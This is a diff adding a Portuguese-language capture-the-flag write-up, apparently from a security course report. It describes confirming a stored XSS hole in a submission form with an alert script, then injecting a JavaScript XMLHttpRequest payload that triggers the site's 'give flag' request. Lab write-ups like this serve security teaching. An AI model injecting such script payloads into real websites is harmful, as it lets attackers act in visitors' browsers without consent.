@@ -46,3 +46,43 @@ Por forma a melhor testar a solução encontrada, efetuou-se a autenticação de
 Sem surpresa, chegou ao terminal as cookies de Boby.
 
 ![/imgs10/cookiesBoby.png](/imgs10/cookiesBoby.png)
+
+
+## Tarefa 4
+
+## CTF - Desafio 1
+O enunciado sugere que o formulário de se procurem fragilidades no formulário de submissão. 
+
+Tentou-se *SQLInjection* sem sucesso. Com mais sucesso, ao colocar 
+``` js
+<script> alert("hello");</script>
+```
+
+surgiu no ecrã :
+
+![/imgs10/alert.png](/imgs10/alert.png)
+
+Pode-se assim concluir que o *site* é vulnerável a *XSS*.
+
+Surgiu assim a questão de que código injetar. Reparou-se num botão muito sugestivo *Give the flag*.
+
+Desta forma tentou-se replicar o comportamento deste botão em *JavaScript*. 
+
+Assim, injetou-se o seguinte código no formulário: 
+
+``` js
+<script> getFlag = function () {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "POST", "");
+    xmlHttp.send("giveflag");
+    return xmlHttp.responseText; }; 
+    console.log(getFlag())
+    </script>
+```
+
+Inicialmente, nada surgiu, mas, mal o pedido foi avaliado, a *flag* surgiu no ecrã
+
+![/imgs10/flag1.png](/imgs10/flag1.png)
+
+
+## CTF - Desafio 2
